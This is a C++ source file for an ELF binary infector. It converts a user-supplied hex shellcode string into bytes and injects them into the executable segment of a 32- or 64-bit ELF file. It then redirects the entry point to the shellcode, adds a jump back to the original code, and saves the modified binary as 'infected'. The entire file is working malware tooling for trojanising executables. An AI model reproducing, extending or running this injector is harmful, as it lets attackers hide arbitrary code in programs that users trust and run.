#include <iostream>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <elf.h>
#include <getopt.h>
#include "string.h"
#include "binject.h"

#define INFECTED_FILE "./infected"
#define ELFHBITS32 0x01
#define ELFHBITS64 0x02

#ifdef BINJECT64
    unsigned char jump_code[] =
        "\x48\xc7\xc5\x00\x00\x00\x00"  // mov rbp, [jump addr]
        "\xff\xe5";                     // jmp rbp
#endif
#ifdef BINJECT32
    unsigned char jump_code[] =
        "\xbd\x00\x00\x00\x00"          // mov ebp, [jump addr]
        "\xff\xe5";                     // jmp ebp
#endif

#define SHUTELF(){\
    if ( elf.buff ) {\
        delete[] elf.buff;\
        if ( !elf.closed ) { elf.close_fd(); }\
    }\
}

#define _FATAL( errbuf, errno ){\
    puts( (errbuf != nullptr) ? errbuf : strerror( errno ) );\
    SHUTELF();\
    std::exit( 0x02 );\
}

#define ERROR( errnum, num ){\
    sprintf(\
        errbuf,\
        "%s", (errnum == ELFTYPE || errnum == ELFORMAT ||\
               errnum == ELFB32  || errnum == ELFB64   ||\
               errnum == ELFXDIGIT)\
        ? elf_err[(errnum * -1) - 1]\
        : strerror( errnum )\
    );\
    return (num == 0x00) ? 0x00 : false ;\
}

void _usage( const char *prog )
{
    std::cout << "Usage: " << prog;
    std::cout << " -f file -s shellcode -p page_size" << "\n";
    std::exit( 0x02 );
}

bool is_xdigit( char ch )
{
    return (!(ch >= '0' && ch <= '9') &&
            !(ch >= 'A' && ch <= 'F') &&
            !(ch >= 'a' && ch <= 'f')) ? false : true ;
}

int xdec( char ch, short base )
{
    if ( ch >= '0' && ch <= '9' ) return ((ch - '0')      * base);
    if ( ch >= 'A' && ch <= 'Z' ) return ((ch - 55 )      * base);
    if ( ch >= 'a' && ch <= 'z' ) return ((ch - 32 - 55 ) * base);
    return -1;
}

/* patch the jump addr (jump_code) */
void shlc_patch_entry( bytecode_t *bytecode, Belf_Addr entry )
{
    size_t jump_size = sizeof( jump_code ) - 1;
    #ifdef BINJECT64
        jump_code[3] =  entry        & 0xFF;
        jump_code[4] = (entry >>  8) & 0xFF;
        jump_code[5] = (entry >> 16) & 0xFF;
    #endif
    #ifdef BINJECT32
        jump_code[1] =  entry        & 0xFF;
        jump_code[2] = (entry >>  8) & 0xFF;
        jump_code[3] = (entry >> 16) & 0xFF;
        jump_code[4] = (entry >> 24) & 0xFF;
    #endif
    // append the jump_code to the shellcode 
    memcpy( bytecode->c + (bytecode->size - jump_size), jump_code, jump_size );
}

/*
 * Convert the shellcode string into bytecode
 */
bytecode_t * binject_bytecode( const char *shellcode )
{
    int c = chcount( shellcode, 'x' );
    if ( c == 0 )
        return nullptr;

    static bytecode_t bytecode;
    bytecode.c = new u_char[c + (sizeof( jump_code ) - 1)];
    if ( !bytecode.c )
        return nullptr;

    bytecode.size = c + (sizeof( jump_code ) - 1);

    int i   = 0;
    int xd1 = 0;
    int xd2 = 0;
    while ( *shellcode != '\x00' ) {
        if ( *shellcode == 'x' )
            *shellcode++;

        if ( !is_xdigit( *shellcode ) || !is_xdigit( *(shellcode + 1) ) ) {
            delete[] bytecode.c;
            return nullptr;
        }
        xd1             = xdec( *shellcode++, 16 );
        xd2             = xdec( *shellcode++,  1 );
        bytecode.c[i++] = xd1 + xd2;
    }
    return &bytecode;
}

/* allocate new buffer (zero fill) */
void * zbuff( size_t size )
{
    char *buff = new char[size];
    if ( !buff )
        return nullptr;

    memset( buff, '\x00', size );
    return (void *) buff;
}

/* initialize elf buffer */
bool init_buff( ELF_t *elf, struct stat st, int page_size ) {
    if ( (elf->buff = (char *) zbuff( st.st_size + page_size )) == nullptr )
        ERROR( errno, 0x01 );

    if ( read( elf->fd, elf->buff, st.st_size ) < 0x00 )
        ERROR( errno, 0x01 );
    return true;
}

/*
 * Load the file
 */
bool binject_load_file( const char *fname, ELF_t *elf, int page_size )
{
    struct stat stat;
    if ( (elf->fd = open( fname, O_RDONLY, 0x00 )) < 0x00 )
        ERROR( errno, 0x01 );

    // file info
    if ( fstat( elf->fd, &stat ) < 0x00 || !S_ISREG( stat.st_mode ) )
        ERROR( errno, 0x01 );

    if ( !init_buff( elf, stat, page_size ) )
    	return false;

    elf->close_fd();
    elf->size  = stat.st_size;
    elf->psize = page_size;
    return true;
}

/* create a copy of the modified file called `infected` */
bool copy_infected( ELF_t *elf, const char *infected )
{
    int fd;
    if ( (fd = open( infected, O_WRONLY | O_CREAT, 0x00 )) < 0x00 ) {
        ERROR( errno, 0x01 );
    }
    if ( write( fd, elf->buff, elf->size + elf->psize ) < 0x00 )
        ERROR( errno, 0x01 );
    close( fd );
    return true;
}

bool assert_elf_arch( const Belf_Ehdr *header )
{
    #ifdef BINJECT32
        if ( header->e_ident[EI_CLASS] != ELFHBITS32 || header->e_machine != 0x03 )
            ERROR( ELFB32, 0x01 );
    #endif
    #ifdef BINJECT64
        if ( header->e_ident[EI_CLASS] != ELFHBITS64 || header->e_machine != 0x3e )
            ERROR( ELFB64, 0x01 );
    #endif
    return true;
}

/*
 * Verify that the target file is a valid one
 */
bool binject_assert_elf( ELF_t *elf )
{
    Belf_Ehdr *header = (Belf_Ehdr *)  elf->buff;
    Belf_Phdr *phdrs  = (Belf_Phdr *) (elf->buff + header->e_phoff);
    Belf_Shdr *shdrs  = (Belf_Shdr *) (elf->buff + header->e_shoff);
    
    u_char magic[0x04] = { ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3 };
    if ( memcmp( header, magic, sizeof( magic ) ) != 0x00 )
        ERROR( ELFORMAT, 0x01 );

    if ( header->e_type != ET_EXEC )
        ERROR( ELFTYPE, 0x01 );
    
    if ( !assert_elf_arch( &header ) )
    	return false;

    puts( (header->e_ident[EI_CLASS] == ELFHBITS64) ? "\n[*] - Elf [x86-64]" : "\n[*] - Elf [x86]" );
    elf->header = header;
    elf->shdr   = shdrs;
    elf->phdr   = phdrs;
    return true;
}
/*
 * Patch program headers, section headers and entry point
 */
void binject_patch_file( ELF_t *elf, Belf_Off offset, Belf_Addr vaddr, size_t size )
{
    elf->header->e_shoff += (elf->header->e_shoff >= offset + size) ? elf->psize : 0 ;
    elf->header->e_phoff += (elf->header->e_phoff >= offset + size) ? elf->psize : 0 ;

    for ( int i = 0 ; i < elf->header->e_phnum ; i++ ) {
        if ( elf->phdr[i].p_offset >= offset + size )
             elf->phdr[i].p_offset += elf->psize;
    }
    for ( int i = 0 ; i < elf->header->e_shnum ; i++ ) {
        if ( elf->shdr[i].sh_offset >= offset + size )
             elf->shdr[i].sh_offset += elf->psize;
    }

    printf( "Old entry point -> 0x%2x\n", elf->header->e_entry );
    elf->header->e_entry = vaddr + size;
    printf( "New entry point -> 0x%2x\n", elf->header->e_entry );
}
/*
 * Inject the shellcode
 */
bool inject_shellcode( ELF_t *elf, const char *shellcode )
{
    bytecode_t *bytecode;
    if ( (bytecode = binject_bytecode( shellcode )) == nullptr ) {
        ERROR( (errno) ? errno : ELFXDIGIT, 0x01 );
    }
    
    Belf_Off    offset;
    Belf_Addr   vaddr;
    size_t      size;

    for ( int i = 0 ; i < elf->header->e_phnum ; i++ ) {
        if ( elf->phdr[i].p_type == PT_LOAD && elf->phdr[i].p_flags == (PF_R | PF_X) ) {
             elf->phdr[i].p_filesz += bytecode->size;
             elf->phdr[i].p_memsz  += bytecode->size;

             offset = elf->phdr[i].p_offset;
             size   = elf->phdr[i].p_filesz - bytecode->size; // original size of segment
             vaddr  = elf->phdr[i].p_vaddr;
             break;
	}
    }
    shlc_patch_entry( bytecode, elf->header->e_entry );
    binject_patch_file( elf, offset, vaddr, size );

    memmove( &elf->buff[offset + size + elf->psize], &elf->buff[offset + size], elf->size - (offset + size) );
    memset(  &elf->buff[offset + size], '\x00', elf->psize );
    memcpy(  &elf->buff[offset + size], bytecode->c, bytecode->size );
    
    delete[] bytecode->c;
    return true;
}

int main( int argc, char **argv )
{
    ELF_t elf;
    int opt;
    char *fname     = nullptr;
    char *shellcode = nullptr;
    elf.buff        = nullptr;
    int page_size   = 0x00;

    while ( (opt = getopt( argc, argv, "f:s:p:" )) != -1 ) {
        switch ( opt )
        {
            case 'f': fname     = optarg;         break;
            case 's': shellcode = optarg;         break;
            case 'p': page_size = atoi( optarg ); break;
            default:
                _usage( argv[0] );
        }
    }
    
    if ( !fname || !shellcode || !page_size )
        _usage( argv[0] );

    if ( !binject_load_file( fname, &elf, page_size ) )
        _FATAL( errbuf, -1 );

    if ( !binject_assert_elf( &elf ) )
        _FATAL( errbuf, -1 );

    if ( !inject_shellcode( &elf, shellcode ) )
        _FATAL( errbuf, -1 );

    if ( !copy_infected( &elf, INFECTED_FILE ) )
        _FATAL( errbuf, -1 );

    SHUTELF();
    std::exit( 0x00 );
}
